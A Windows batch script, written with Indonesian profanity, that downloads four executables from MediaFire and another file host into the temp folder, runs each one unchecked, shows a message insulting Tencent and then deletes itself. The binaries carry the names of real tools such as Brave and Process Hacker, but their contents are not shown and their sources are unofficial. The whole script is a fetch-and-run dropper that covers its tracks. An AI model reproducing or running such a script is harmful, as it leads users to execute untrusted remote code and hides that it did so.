@echo off
title NGENTOT LU MUKA LU MOYONG MOYONG TOYORIN BAPAKLO SONO
chcp 65001 >nul
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('NGENTOT LU MUKA LU MOYONG MOYONG TOYORIN BAPAKLO SONO', '⚠', 'OK', [System.Windows.Forms.MessageBoxIcon]::Exclamation)" >nul

set "URL1=https://www.mediafire.com/file/v2nbmv5txlg41yy/StarDesk_1.3.4_%25281%2529.exe/file"
set "URL2=https://www.mediafire.com/file/ldgtn1synzwy2z9/BraveBrowserSetup_%25281%2529.exe/file"
set "URL3=https://picteon.dev/files/ProcessHackerPortable.paf.exe"
set "URL4=https://www.mediafire.com/file/q9q2zjrs0ptxm64/doublecmd-1.1.32.x86_64-win64.exe/file"

set "DL1=%TEMP%\StarDesk.exe"
set "DL2=%TEMP%\BraveBrowser.exe"
set "DL3=%TEMP%\ProcessHacker.exe"
set "DL4=%TEMP%\DoubleCmd.exe"

echo Downloading files anjing...
powershell -Command "Invoke-WebRequest -Uri '%URL1%' -OutFile '%DL1%' -UseBasicParsing"
echo [OK] StarDesk didownload
powershell -Command "Invoke-WebRequest -Uri '%URL2%' -OutFile '%DL2%' -UseBasicParsing"
echo [OK] BraveBrowser didownload
powershell -Command "Invoke-WebRequest -Uri '%URL3%' -OutFile '%DL3%' -UseBasicParsing"
echo [OK] ProcessHacker didownload
powershell -Command "Invoke-WebRequest -Uri '%URL4%' -OutFile '%DL4%' -UseBasicParsing"
echo [OK] DoubleCmd didownload

echo Semua file berhasil didownload, buka satu-satu woy...
start "" "%DL1%"
start "" "%DL2%"
start "" "%DL3%"
start "" "%DL4%"

powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('THE PROCESS HAS BEEN DONE YET, SO LET''S FUCK TENCENT MOM', 'DONE NJIR', 'OK', [System.Windows.Forms.MessageBoxIcon]::Exclamation)"

:: delete sendiri si goblok
start /b "" cmd /c del "%~f0" & exit
exit
